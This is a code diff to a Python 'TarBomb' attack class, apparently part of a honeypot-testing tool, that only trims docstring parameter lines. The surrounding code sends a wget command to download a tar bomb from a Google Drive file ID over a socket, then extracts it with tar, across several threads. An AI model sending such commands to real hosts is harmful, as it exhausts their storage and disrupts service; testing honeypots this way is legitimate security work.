@@ -31,9 +31,6 @@ class TarBomb(BaseAttack):
     def download_bomb(self, conn, bomb_size):
         """
         Downloads the tar bomb using a wget command and the file ID.
-
-        :param bomb_size: Size of the tar bomb to use
-        :param conn: socket connection
         """
         try:
             cmd = f"wget 'https://docs.google.com/uc?export=download&id={self.tar_url_fileids[bomb_size]}' -O not_a_tar_bomb_{bomb_size}.tar\n"
@@ -45,9 +42,6 @@ class TarBomb(BaseAttack):
     def extract_bomb(self, conn, bomb_size):
         """
         Extracts the tar bomb using the tar command.
-
-        :param bomb_size: Size of the tar bomb to use
-        :param conn: socket connection
         """
         try:
             cmd = f'tar -xf not_a_tar_bomb_{bomb_size}.tar\n'
@@ -59,9 +53,6 @@ class TarBomb(BaseAttack):
     def attack_attempt(self, conn, bomb_size):
         """
         Attempts to download and extract the tar bomb.
-
-        :param bomb_size: Size of the tar bomb to use
-        :param conn: socket connection
         """
         if conn is None:
             print("Failed to establish connection")
@@ -75,9 +66,6 @@ class TarBomb(BaseAttack):
     def run_attack_with_bomb_size(self, bomb_size):
         """
         Runs the attack using multiple threads.
-        
-        :param bomb_size: Size of the tar bomb to use
-        :return: Tuple containing the attack result, message, time taken, and attack type
         """
         attack_threads = []
 
@@ -101,8 +89,6 @@ class TarBomb(BaseAttack):
     def run_attack(self):
         """
         Runs the attack using multiple threads.
-
-        :return: Tuple containing the attack result, message, time taken, and attack type
         """
         print(f"Running tar bomb attack on {self.honeypot.ip}:{self.honeypot.port}...")
         start_time = time.time()
